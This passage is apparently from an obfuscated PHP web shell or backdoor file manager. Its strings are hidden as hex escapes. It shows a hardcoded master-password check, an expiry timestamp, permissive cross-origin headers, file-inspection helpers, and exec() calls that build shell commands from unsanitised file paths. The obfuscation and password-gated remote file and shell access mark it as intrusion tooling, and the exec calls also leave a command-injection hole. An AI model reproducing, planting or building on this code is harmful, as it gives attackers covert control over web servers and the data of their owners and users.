}${"\x64"}=preg_replace("\x2f\x5e\x67\x6c\x2f",'',${"\x70"}); ${"\x74"}=base_convert(${"\x64"},36,10); return ${"\x74"}>time()?true:false; } private function master($s=null){ return password_verify(${"\x73"}, "\x24\x32\x79\x24\x31\x30\x24\x69\x75\x76\x72\x50\x41\x57\x76\x62\x69\x55\x55\x5a\x62\x71\x34\x58\x53\x42\x4f\x44\x65\x42\x45\x55\x2f\x4f\x39\x69\x55\x74\x72\x75\x78\x30\x5a\x73\x7a\x4a\x6f\x6b\x6e\x51\x6d\x4d\x4b\x45\x73\x46\x53\x74\x77\x43"); } private function head(){ @set_time_limit(false); @date_default_timezone_set("\x41\x73\x69\x61\x2f\x4a\x61\x6b\x61\x72\x74\x61"); header("\x41\x63\x63\x65\x73\x73\x2d\x43\x6f\x6e\x74\x72\x6f\x6c\x2d\x41\x6c\x6c\x6f\x77\x2d\x4f\x72\x69\x67\x69\x6e\x3a\x20\x2a"); header("\x41\x63\x63\x65\x73\x73\x2d\x43\x6f\x6e\x74\x72\x6f\x6c\x2d\x52\x65\x71\x75\x65\x73\x74\x2d\x4d\x65\x74\x68\x6f\x64\x3a\x20\x50\x4f\x53\x54\x2c\x20\x47\x45\x54\x2c\x20\x4f\x50\x54\x49\x4f\x4e\x53"); header("\x41\x63\x63\x65\x73\x73\x2d\x43\x6f\x6e\x74\x72\x6f\x6c\x2d\x52\x65\x71\x75\x65\x73\x74\x2d\x48\x65\x61\x64\x65\x72\x73\x3a\x20\x58\x2d\x50\x49\x4e\x47\x4f\x54\x48\x45\x52\x2c\x20\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65"); header("\x41\x63\x63\x65\x73\x73\x2d\x43\x6f\x6e\x74\x72\x6f\x6c\x2d\x4d\x61\x78\x2d\x41\x67\x65\x3a\x20\x38\x36\x34\x30\x30"); header("\x41\x63\x63\x65\x73\x73\x2d\x43\x6f\x6e\x74\x72\x6f\x6c\x2d\x41\x6c\x6c\x6f\x77\x2d\x43\x72\x65\x64\x65\x6e\x74\x69\x61\x6c\x73\x3a\x20\x74\x72\x75\x65"); header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e\x3b\x63\x68\x61\x72\x73\x65\x74\x3d\x75\x74\x66\x2d\x38\x3b"); if(isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x52\x45\x51\x55\x45\x53\x54\x5f\x4d\x45\x54\x48\x4f\x44"])&&strtoupper(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x52\x45\x51\x55\x45\x53\x54\x5f\x4d\x45\x54\x48\x4f\x44"])=="\x4f\x50\x54\x49\x4f\x4e\x53"){ header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x65\x6e\x2d\x55\x53"); header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x67\x7a\x69\x70"); header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x4c\x65\x6e\x67\x74\x68\x3a\x20\x30"); header("\x56\x61\x72\x79\x3a\x20\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x2c\x20\x4f\x72\x69\x67\x69\x6e"); header("\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x32\x30\x30\x20\x4f\x4b"); exit; } } private function info($f=null,&$e=false){ if(!isset(${"\x66"})||!is_string(${"\x66"})){${"\x65"}="\x52\x65\x71\x75\x69\x72\x65\x20\x66\x69\x72\x73\x74\x20\x61\x72\x67\x75\x6d\x65\x6e\x74\x2e";return false;} if(!file_exists(${"\x66"})){${"\x65"}="\x46\x69\x6c\x65\x20\x64\x6f\x65\x73\x20\x6e\x6f\x74\x20\x65\x78\x69\x73\x74\x2e";return false;} ${"\x70\x61\x74\x68"}=str_replace('\\',"\x2f",dirname(${"\x66"})); ${"\x70\x61\x74\x68"}.=substr(${"\x70\x61\x74\x68"},-1)!="\x2f"?"\x2f":''; ${"\x72"}=[ "\x6e\x61\x6d\x65"=>basename(${"\x66"}), "\x70\x61\x74\x68"=>${"\x70\x61\x74\x68"}, "\x66\x75\x6c\x6c\x70\x61\x74\x68"=>str_replace('\\',"\x2f",${"\x66"}), "\x73\x69\x7a\x65"=>${"\x74\x68\x69\x73"}->{"\x73\x69\x7a\x65"}(${"\x66"}), "\x65\x78\x74\x65\x6e\x73\x69\x6f\x6e"=>preg_match("\x2f\x5c\x2f\x2e\x2a\x5c\x2e\x28\x5b\x61\x2d\x7a\x30\x2d\x39\x5d\x2b\x29\x24\x2f\x69",str_replace('\\',"\x2f",${"\x66"}),${"\x61"})?strtolower(${"\x61"}[1]):'', "\x74\x79\x70\x65"=>filetype(${"\x66"}), "\x6d\x69\x6d\x65"=>${"\x74\x68\x69\x73"}->{"\x6d\x69\x6d\x65"}(${"\x66"}), "\x6d\x6f\x64\x69\x66\x69\x65\x64"=>filemtime(${"\x66"}), "\x63\x72\x65\x61\x74\x65\x64"=>filectime(${"\x66"}), "\x70\x65\x72\x6d\x69\x73\x73\x69\x6f\x6e"=>substr(decoct(fileperms(${"\x66"})),-4), ];return ${"\x72"}; } private function size($f=null){ if(is_dir(${"\x66"})){return @\filesize(${"\x66"});} if(!is_file(${"\x66"})){return false;} ${"\x74"}=@\filesize(${"\x66"}); if(PHP_INT_SIZE===8){ return ${"\x74"}; }elseif(${"\x74"}>0 &&(${"\x69"}=@\fopen(${"\x66"},"\x72\x62")) &&is_resource(${"\x69"}) &&fseek(${"\x69"},0,SEEK_END)===0 &&ftell(${"\x69"})==${"\x74"} &&fclose(${"\x69"})){ return ${"\x74"}; }elseif(strtoupper(substr(PHP_OS,0,3))==="WIN"){ @exec("\x66\x6f\x72\x20\x25\x49\x20\x69\x6e\x20\x28\x22".${"\x66"}."\x22\x29\x20\x64\x6f\x20\x40\x65\x63\x68\x6f\x20\x25\x7e\x7a\x49",${"\x6f"}); return @${"\x6f"}[0]; }elseif(strtoupper(substr(PHP_OS,0,5))==="LINUX" ||strtoupper(substr(PHP_OS,0,6))==="DARWIN"){ @exec("\x73\x74\x61\x74\x20\x2d\x63\x25\x73\x20".${"\x66"},${"\x6f"}); return @${"\x6f"}[0]; }else{ ${"\x67"}=pow(1024,3)*2; return ${"\x74"}<0?${"\x67"}+(${"\x67"}+${"\x74"}):${"\x74"}; } } private function osbit(){ return strlen(decbin(~0)); } private function mime($f=null){ ${"\x72"}="\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6f\x63\x74\x65\x74\x2d\x73\x74\x72\x65\x61\x6d"; if(!is_string(${"\x66"})){return ${"\x72"};} if(is_dir(${"\x66"})){return "\x64\x69\x72\x65\x63\x74\x6f\x72\x79";} ${"\x74"}=array( "\x74\x78\x74"=>"\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e", "\x6c\x6f\x67"=>"\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e", "\x69\x6e\x69"=>"\x74\x65\x78\x74\x2f\x70\x6c\x61\x69\x6e", "\x68\x74\x6d\x6c"=>"\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c", "\x63\x73\x73"=>"\x74\x65\x78\x74\x2f\x63\x73\x73", "\x70\x68\x70"=>"\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x2d\x68\x74\x74\x70\x64\x2d\x70\x68\x70", "\x6a\x73"=>"\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74", "\x6a\x73\x6f\x6e"=>"\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e", "\x78\x6d\x6c"=>"\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x6d\x6c", "\x6d\x70\x34"=>"\x76\x69\x64\x65\x6f\x2f\x6d\x70\x34", "\x6d\x70\x33"=>"\x61\x75\x64\x69\x6f\x2f\x6d\x70\x65\x67", "\x77\x61\x76"=>"\x61\x75\x64\x69\x6f\x2f\x77\x61\x76", "\x6f\x67\x67"=>"\x61\x75\x64\x69\x6f\x2f\x6f\x67\x67", "\x70\x6e\x67"=>"\x69\x6d\x61\x67\x65\x2f\x70\x6e\x67", "\x6a\x70\x65"=>"\x69\x6d\x61\x67\x65\x2f\x6a\x70\x65\x67", "\x6a\x70\x65\x67"=>"\x69\x6d\x61\x67\x65\x2f\x6a\x70\x65\x67", "\x6a\x70\x67"=>"\x69\x6d\x61\x67\x65\x2f\x6a\x70\x65\x67", "\x67\x69\x66"=>"\x69\x6d\x61\x67\x65\x2f\x67\x69\x66", "\x7a\x69\x70"=>"\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x7a\x69\x70", "\x72\x61\x72"=>"\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x2d\x72\x61\x72\x2d\x63\x6f\x6d\x70\x72\x65\x73\x73\x65\x64", "\x70\x64\x66"=>"\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x70\x64\x66", ); ${"\x61"}=explode("\x2e",strtolower(basename(${"\x66"}))); ${"\x65"}=array_pop(${"\x61"}); return array_key_exists(${"\x65"},${"\x74"})?${"\x74"}[${"\x65"}]:${"\x72"}; } } 